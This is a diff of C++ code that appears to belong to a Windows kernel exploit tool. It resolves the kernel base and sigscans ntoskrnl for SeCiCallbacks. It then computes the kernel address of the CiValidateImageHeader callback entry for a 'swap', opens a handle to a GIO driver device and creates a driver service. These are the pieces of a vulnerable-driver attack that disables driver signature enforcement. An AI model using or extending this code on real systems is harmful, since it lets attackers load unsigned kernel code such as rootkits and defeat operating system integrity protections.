@@ -12,7 +12,7 @@ PVOID GetProcessHeapFromPEB()
     return pPeb ? pPeb->ProcessHeap : nullptr;
 }
 
-static NTSTATUS modules::FindKernelModule( PCCH ModuleName, PULONG_PTR ModuleBase )
+NTSTATUS modules::FindKernelModule( PCCH ModuleName, PULONG_PTR ModuleBase )
 {
     *ModuleBase = { 0 };
 
@@ -44,36 +44,43 @@ Exit:
     return stat;
 }
 
-static ULONG_PTR modules::GetKernelModuleAddress( const char* name ) {
-    DWORD size{ 0 };
-    void* buf{ NULL };
-    PRTL_PROCESS_MODULES mods;
+ULONG_PTR modules::GetKernelModuleAddress( const char* name ) {
 
-    NTSTATUS stat = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, buf, size, &size );
+    DWORD size = 0;
+    void* buffer = NULL;
+    PRTL_PROCESS_MODULES modules;
 
-    while ( stat == STATUS_INFO_LENGTH_MISMATCH ) {
-        VirtualFree( buf, 0, MEM_RELEASE );
+    NTSTATUS status = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, buffer, size, &size );
 
-        buf = VirtualAlloc( NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
-        stat = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, buf, size, &size );
+    while ( status == STATUS_INFO_LENGTH_MISMATCH ) {
+        VirtualFree( buffer, 0, MEM_RELEASE );
+
+        buffer = VirtualAlloc( NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+        status = NtQuerySystemInformation( ( SYSTEM_INFORMATION_CLASS )11, buffer, size, &size );
     }
 
-    if ( !NT_SUCCESS( stat ) ) VirtualFree( buf, 0, MEM_RELEASE ); return 0;
+    if ( !NT_SUCCESS( status ) )
+    {
+        VirtualFree( buffer, 0, MEM_RELEASE );
+        return NULL;
+    }
 
-    mods = ( PRTL_PROCESS_MODULES )buf;
+    modules = ( PRTL_PROCESS_MODULES )buffer;
 
-    for ( int i = 0; i < mods->NumberOfModules; i++ ) {
-        char* current_name = ( char* )mods->Modules[i].FullPathName + mods->Modules[i].OffsetToFileName;
+    for ( int i = 0; i < modules->NumberOfModules; i++ )
+    {
+        char* currentName = ( char* )modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
 
-        if ( !_stricmp( current_name, name ) ) {
-            ULONG_PTR res = ( ULONG_PTR )mods->Modules[i].ImageBase;
-            VirtualFree( buf, 0, MEM_RELEASE );
-            return res;
+        if ( !_stricmp( currentName, name ) ) {
+            ULONG_PTR result = ( ULONG_PTR )modules->Modules[i].ImageBase;
+            wprintf( L"[*] Kernel VA: 0x%p\n", result );
+            VirtualFree( buffer, 0, MEM_RELEASE );
+            return result;
         }
     }
-    VirtualFree( buf, 0, MEM_RELEASE );
-    return 0;
 
+    VirtualFree( buffer, 0, MEM_RELEASE );
+    return NULL;
 }
 
 seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
@@ -90,39 +97,59 @@ seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
     MODULEINFO modinfo;
     GetModuleInformation( GetCurrentProcess(), usermode_load_va, &modinfo, sizeof( modinfo ) );
 
-    // pattern: lea r8, [nt!SeCiCallbacks]
-    static const unsigned char leaSeCiCallbacks[] = { 0xFF, 0x48, 0x8B, 0xD3, 0x4C, 0x8D, 0x05 };
+    // pattern sigscan for lea r8, [nt!SeCiCallbacks]
+    unsigned char pattern[] = { 0xff, 0x48, 0x8b, 0xd3, 0x4c, 0x8d, 0x05 };
 
-    DWORD64 match = helpers::FindBytes64( uNtAddr, modinfo.SizeOfImage, leaSeCiCallbacks, sizeof( leaSeCiCallbacks ) );
-    if ( !match )
+    // pattern scanning 
+    DWORD64 seCiCallbacksInstr = 0x0;
+    for ( unsigned int i = 0; i < modinfo.SizeOfImage; i++ )
     {
-        wprintf( L"[!] Couldn't find lea r8, [nt!SeCiCallbacks]\n" );
-        return { !STATUS_SUCCESS };
+
+        for ( int j = 0; j < sizeof( pattern ); j++ )
+        {
+            unsigned char chr = *( char* )( uNtAddr + i + j );
+            if ( pattern[j] != chr )
+            {
+
+                break;
+            }
+            if ( j + 1 == sizeof( pattern ) )
+            {
+                seCiCallbacksInstr = uNtAddr + i + 4; // one occurence only 
+            }
+        }
     }
-
-    // +4 to land on the displacement field, exactly as in the original snippet
-    DWORD64 seCiCallbacksInstr = match + 4;
-
-    wprintf( L"[*] Instr: 0x%016llX\n", static_cast< unsigned long long >( seCiCallbacksInstr ) );
+    if ( seCiCallbacksInstr == 0x0 )
+    {
+        wprintf( L"[!] Couldnt find lea r8, [nt!SeCiCallbacks]" );
+    }
+    else
+    {
+        wprintf( L"[*] Instr: %p\n", seCiCallbacksInstr );
+    }
    
-    DWORD32 seCiCallbacksLeaOffset = *( DWORD32* )( seCiCallbacksInstr + 3 );
+    // Read the 32-bit signed displacement from the LEA instruction's displacement field
+    INT32 seCiCallbacksLeaOffset = *( INT32* )( seCiCallbacksInstr + 3 );
 
-    // The LEA instruction searched for does 32bit math, hence overflow into the more significant 32 bits must be prevented.
-    DWORD32 seCiCallbacksInstrLow = ( DWORD32 )seCiCallbacksInstr;
-    DWORD32 seCiCallbacksAddrLow = seCiCallbacksInstrLow + 3 + 4 + seCiCallbacksLeaOffset;
-    
-    // calc struct's address in usermode
-    DWORD64 seCiCallbacksAddr = ( seCiCallbacksInstr & 0xFFFFFFFF00000000 ) + seCiCallbacksAddrLow;
-    wprintf( L"[*] Usermode CiCallback: 0x%016llX\n", static_cast< unsigned long long >( seCiCallbacksAddr ) );
-    
-    // calc offset form base 
+    // Calculate the address of the next instruction after displacement field (4 bytes after offset)
+    DWORD64 nextInstructionAddr = seCiCallbacksInstr + 3 + 4;
+
+    // Calculate the target address by adding signed displacement to the next instruction address
+    DWORD64 seCiCallbacksAddr = nextInstructionAddr + seCiCallbacksLeaOffset;
+
+    wprintf( L"[*] Usermode CiCallbacks: 0x%016llX\n", seCiCallbacksAddr );
+
+    // Calculate offset from base of usermode ntoskrnl.exe module
     DWORD64 KernelOffset = seCiCallbacksAddr - uNtAddr;
-    wprintf( L"[*] Offset: 0x%016llX\n", static_cast< unsigned long long >( KernelOffset ) );
-    
+    wprintf( L"[*] Offset: 0x%016llX\n", KernelOffset );
+
+    // Calculate absolute kernel address based on kernel base + offset
     DWORD64 kernelAddress = mod_base + KernelOffset;
-    DWORD64 zwFlushInstructionCache = ( DWORD64 )GetProcAddress( usermode_load_va, "ZwFlushInstructionCache" ) - uNtAddr + ( DWORD64 )mod_base;
-    
-    // add hardcoded offset to the SeCiCallbacks struct to get to CiValidateImageHeader's entry 
+
+    // Resolve kernel ZwFlushInstructionCache address similarly (same math)
+    DWORD64 zwFlushInstructionCache = ( DWORD64 )GetProcAddress( usermode_load_va, "ZwFlushInstructionCache" ) - uNtAddr + mod_base;
+
+    // Add hardcoded offset to get to CiValidateImageHeader entry
     DWORD64 ciValidateImageHeaderEntry = kernelAddress + 0x20;
 
     return seCiCallbacks_swap{
@@ -130,16 +157,17 @@ seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
         zwFlushInstructionCache
     };
 
+
 }
 
 NTSTATUS modules::OpenDeviceHandle( _Out_ PHANDLE DeviceHandle, _In_ BOOLEAN PrintErrors )
 {
-    UNICODE_STRING DeviceName = RTL_CONSTANT_STRING( GIO_DEVICE_NAME );
-    OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES( &DeviceName, OBJ_CASE_INSENSITIVE );
+    UNICODE_STRING devName = RTL_CONSTANT_STRING( GIO_DEVICE_NAME );
+    OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES( &devName, OBJ_CASE_INSENSITIVE );
     IO_STATUS_BLOCK IoStatusBlock;
 
     const NTSTATUS Status = NtCreateFile( DeviceHandle,
-        SYNCHRONIZE, // Yes, these really are the only access rights needed. (actually would be 0, but we want SYNCHRONIZE to wait on NtDeviceIoControlFile)
+        SYNCHRONIZE, 
         &ObjectAttributes,
         &IoStatusBlock,
         nullptr,
@@ -150,8 +178,8 @@ NTSTATUS modules::OpenDeviceHandle( _Out_ PHANDLE DeviceHandle, _In_ BOOLEAN Pri
         nullptr,
         0 );
 
-    if ( !NT_SUCCESS( Status ) && PrintErrors ) // The first open is expected to fail; don't spam the user about it
-        wprintf( L"Failed to obtain handle to device %wZ: NtCreateFile: %08X.\n", &DeviceName, Status );
+    if ( !NT_SUCCESS( Status ) && PrintErrors ) 
+        wprintf( L"Failed to obtain handle to device %wZ: NtCreateFile: %08X.\n", &devName, Status );
 
     return Status;
 }
@@ -173,7 +201,7 @@ NTSTATUS modules::CreateDriverService( PWCHAR ServiceName, PWCHAR FileName )
 
     Status = RtlWriteRegistryValue( RTL_REGISTRY_ABSOLUTE, ServiceName, L"Type", REG_DWORD, &ServiceType, sizeof( ServiceType ) );
 
-    std::wprintf( L"[*] Service Created for %ws and File %ws\n", ServiceName, FileName );
+    std::wprintf( L"[*] Service Created for %ws\n", FileName );
     return Status;
 }
 
